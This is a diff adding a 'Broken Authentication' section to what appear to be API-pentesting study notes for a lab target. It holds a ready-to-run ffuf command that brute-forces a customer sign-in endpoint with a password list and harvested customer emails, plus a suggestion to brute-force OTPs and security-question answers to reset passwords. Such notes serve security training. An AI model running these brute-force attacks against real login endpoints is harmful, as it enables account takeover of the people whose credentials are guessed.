@@ -19,3 +19,11 @@ do curl -s -w "\n" -X 'GET' \
 -H 'Authorization: Bearer eyJhbG<SNIP>' | jq;
 done
 ```
+
+## Broken Authentication
+No rate-limiting on the endpoint, so brute-forcing is possible.
+```
+ffuf -w /opt/useful/seclists/Passwords/xato-net-10-million-passwords-10000.txt:PASS -w customerEmails.txt:EMAIL -u http://$ip:$port/api/v1/authentication/customers/sign-in -X POST -H "Content-Type: application/json" -d '{"Email": "EMAIL", "Password": "PASS"}' -fr "Invalid Credentials" -t 100
+```
+### Brute-forcing OTPs and Answers of Security Questions
+If brute-forcing passwords is infeasible due to strong password policies, we can attempt to brute-force OTPs or answers to security questions to reset passwords.
